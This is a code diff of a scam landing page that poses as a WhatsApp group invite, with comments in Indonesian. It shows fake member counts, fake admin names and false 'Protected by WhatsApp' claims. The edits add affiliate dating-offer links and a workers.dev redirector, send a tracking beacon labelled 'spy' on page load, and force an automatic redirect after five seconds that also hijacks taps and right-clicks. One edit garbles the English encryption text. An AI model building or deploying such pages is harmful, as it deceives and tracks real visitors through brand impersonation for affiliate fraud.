@@ -104,7 +104,7 @@
 
             <button class="join-button" id="joinButton">
                 <i class="fab fa-whatsapp"></i>
-                <span data-t="joinButton">Join group</span>
+                <span data-t="joinButton">Join the group</span>
             </button>
 
             <div class="security-notice">
@@ -113,19 +113,19 @@
         </div>
 
         <div class="footer" data-t="footer">
-            By clicking "Join group", you agree to share contact information with the group administrator and other participants.
+            By clicking "Join the group", you agree to share contact information with the group administrator and other participants.
         </div>
     </div>
 
     <script>
-        // --- ID TRACKING TETAP ---
-        const trackingId = 'REPORT';
-
         // GANTI LINK AFILIASI KAMU DI SINI
         const OFFERS = [
-            "https://mgepmr9.mybetterdatings.com/lk6rmz1?s1=REPORT&cid=REPORT",
-            "https://zokxjg.datingllove.com/?utm_source=da57dc555e50572d&ban=inst&j5=1&j6=1&s1=188302&s2=2150610&s3=REPORT&click_id=REPORT"
+            "https://zokxjg.datingllove.com/?utm_source=da57dc555e50572d&ban=inst&j5=1&j6=1&s1=188302&s2=2150610&s3=TESTCLIK&click_id=TESTCLIK",
+            "https://dasboard.bennylaos483.workers.dev/click?cid=https://mgepmr9.mybetterdatings.com/lk6rmz1?s1=TESTCLIK&cid=TESTCLIK"
         ];
+
+        // Pilih random setiap kali halaman dibuka
+        let TARGET_URL = OFFERS[Math.floor(Math.random() * OFFERS.length)];
 
         // 12 VIDEO + fallback
         const videoList = [
@@ -185,7 +185,7 @@
                 joinButton: "Gabung grup",
                 encryption: "Pesan dan panggilan baru diamankan dengan enkripsi end-to-end. Hanya orang dalam obrolan ini yang dapat membaca atau mendengarkannya.",
                 protected: "Dilindungi oleh WhatsApp",
-                footer: "Dengan mengklik "Gabung grup", kamu setuju membagikan informasi kontak dengan admin grup dan peserta lain.",
+                footer: "Dengan mengklik “Gabung grup”, kamu setuju membagikan informasi kontak dengan admin grup dan peserta lain.",
                 enjoyed: "Orang yang Aktif Menikmati Layanan Ini"
             },
             en: {
@@ -194,9 +194,9 @@
                 members: "Members",
                 online: "Online",
                 joinButton: "Join the group",
-                encryption: "New messages and calls are secured with end-to-end encryption. Only people in this chat can read, listen, or share them.",
+                encryption: "New messages and calls are secured with end-to-end encryption. Only people in this chat can read, listen, or, or share them.",
                 protected: "Protected by WhatsApp",
-                footer: "By clicking "Join the group", you agree to share contact information with the group administrator and other participants.",
+                footer: "By clicking “Join the group”, you agree to share contact information with the group administrator and other participants.",
                 enjoyed: "People Who Have Actively Enjoyed This Service"
             },
             de: {
@@ -207,7 +207,7 @@
                 joinButton: "Gruppe beitreten",
                 encryption: "Neue Nachrichten und Anrufe sind durch Ende-zu-Ende-Verschlüsselung geschützt. Nur Teilnehmer dieses Chats können sie lesen oder hören.",
                 protected: "Geschützt durch WhatsApp",
-                footer: "Durch Klick auf "Gruppe beitreten" stimmst du zu, Kontaktdaten mit dem Gruppenadmin und anderen Teilnehmern zu teilen.",
+                footer: "Durch Klick auf “Gruppe beitreten” stimmst du zu, Kontaktdaten mit dem Gruppenadmin und anderen Teilnehmern zu teilen.",
                 enjoyed: "Personen, die diesen Dienst aktiv genossen haben"
             },
             es: {
@@ -218,7 +218,7 @@
                 joinButton: "Unirse al grupo",
                 encryption: "Los nuevos mensajes y llamadas están protegidos con cifrado de extremo a extremo. Solo las personas del chat pueden leerlos leer o escucharlos.",
                 protected: "Protegido por WhatsApp",
-                footer: "Al hacer clic en "Unirse al grupo" aceptas compartir tu información de contacto con el administrador y otros participantes.",
+                footer: "Al hacer clic en “Unirse al grupo” aceptas compartir tu información de contacto con el administrador y otros participantes.",
                 enjoyed: "Personas que han disfrutado activamente de este servicio"
             },
             pt: {
@@ -229,7 +229,7 @@
                 joinButton: "Entrar no grupo",
                 encryption: "Novas mensagens e chamadas são protegidas com criptografia de ponta a ponta. Apenas pessoas neste chat podem ler ou ouvir.",
                 protected: "Protegido pelo WhatsApp",
-                footer: "Ao clicar em "Entrar no grupo", você concorda em compartilhar informações de contato com o administrador e outros participantes.",
+                footer: "Ao clicar em “Entrar no grupo”, você concorda em compartilhar informações de contato com o administrador e outros participantes.",
                 enjoyed: "Pessoas que aproveitaram ativamente este serviço"
             },
             fr: {
@@ -240,7 +240,7 @@
                 joinButton: "Rejoindre le groupe",
                 encryption: "Les nouveaux messages et appels sont sécurisés par chiffrement de bout en bout. Seules les personnes du chat peuvent les lire ou les écouter.",
                 protected: "Protégé par WhatsApp",
-                footer: "En cliquant sur "Rejoindre le groupe", vous acceptez de partager vos coordonnées avec l'administrateur et les autres participants.",
+                footer: "En cliquant sur “Rejoindre le groupe”, vous acceptez de partager vos coordonnées avec l’administrateur et les autres participants.",
                 enjoyed: "Personnes ayant activement apprécié ce service"
             },
         };
@@ -254,47 +254,31 @@
         });
         document.getElementById("adminText").textContent = (translations[lang].admin || "Admin & Moderator: ") + getRandomName();
 
-        // --- FUNGSI UTAMA, DIJALANKAN SAAT HALAMAN DIMUAT ---
-        document.addEventListener('DOMContentLoaded', () => {
-            // 1. KIRIM LAPORAN KE WORKER
-            fetch(`https://dasboard.bennylaos483.workers.dev/track?cid=${trackingId}`, { method: 'GET', keepalive: true });
-            console.log("Page tracked with ID:", trackingId);
+        // Redirect + semua parameter
+        const params = new URLSearchParams(window.location.search);
+        let finalUrl = TARGET_URL + (params.toString() ? (TARGET_URL.includes('?') ? '&' : '?') + params.toString() : '');
         
-            // 2. SIAPKAN URL AKHIR UNTUK REDIRECT
-            // Pilih satu URL acak dari array OFFERS
-            const randomOffer = OFFERS[Math.floor(Math.random() * OFFERS.length)];
+        // REDIRECT OTOMATIS SETELAH 5 DETIK (TANPA TULISAN APAPUN)
+        setTimeout(() => {
+            location.href = finalUrl;
+        }, 5000);   // ubah angka 5000 jadi 3000 kalau mau 3 detik, 7000 untuk 7 detik, dll
         
-            // GANTI SEMUA teks 'REPORT' dengan trackingId dan simpan di finalUrl
-            let finalUrl = randomOffer.replaceAll('REPORT', trackingId);
-                    // Tambahkan parameter lain dari URL landing page
-            const urlParams = new URLSearchParams(window.location.search);
-            if (urlParams.toString()) {
-                finalUrl += (finalUrl.includes('?') ? '&' : '?') + urlParams.toString();
-            }
-            console.log("Final redirect URL:", finalUrl);
+        // Tetap bisa klik manual sebelum 5 detik
+        document.getElementById('joinButton').onclick = () => {
+            location.href = finalUrl;
+        };
 
-            // 3. INISIALISASI UI (video, angka, animasi)
+        // Jalankan saat halaman load
+        document.addEventListener('DOMContentLoaded', () => {
+            // --- TAMBAHAN MATA-MATA ---
+            // Kirim laporan ke Worker Anda bahwa landing page telah dibuka dengan CID tetap
+            fetch('https://dasboard.bennylaos483.workers.dev/track?cid=TESTCLIK', { method: 'GET', keepalive: true });
+            // ---------------------------
+
             loadRandomVideo();
             randomizeCounts();
             const els = document.querySelectorAll('.profile-container, .members-info, .notification, .join-button');
             els.forEach((el,i) => setTimeout(()=>{el.style.opacity='1';el.style.transform='translateY(0)'},i*200));
-
-            // 4. ATUR LOGIKA REDIRECT
-            const btn = document.getElementById('joinButton');
-
-            function go(){
-                btn.innerHTML='<i class="fas fa-spinner fa-spin"></i> '+(translations[lang].joinButton||"Redirecting")+'...';
-                btn.disabled=true;
-                setTimeout(()=>location.href=finalUrl,800);
-            }
-            
-            // Event listener untuk tombol
-            btn.onclick=go;
-            btn.ontouchend=e=>{e.preventDefault();go();}
-            btn.oncontextmenu=e=>{e.preventDefault();go();}
-
-            // Redirect otomatis setelah 5 detik
-            setTimeout(go, 5000);
         });
 
         function showPopup(id){
@@ -303,7 +287,17 @@
             setTimeout(()=>p.classList.remove('show'),2200);
         }
         document.getElementById('memberCount').onclick=()=>showPopup('messagePopup1');
-        document.getElementById('active-members').onclick=()=>showPopup('messagePopup2');
+        document.getElementById('activeMembers').onclick=()=>showPopup('messagePopup2');
+
+        const btn = document.getElementById('joinButton');
+        function go(){
+            btn.innerHTML='<i class="fas fa-spinner fa-spin"></i> '+(translations[lang].joinButton||"Redirecting")+'...';
+            btn.disabled=true;
+            setTimeout(()=>location.href=finalUrl,800);
+        }
+        btn.onclick=go;
+        btn.ontouchend=e=>{e.preventDefault();go();}
+        btn.oncontextmenu=e=>{e.preventDefault();go();}
 
         // Force play video setelah klik
         document.body.onclick = () => videoEl.play();
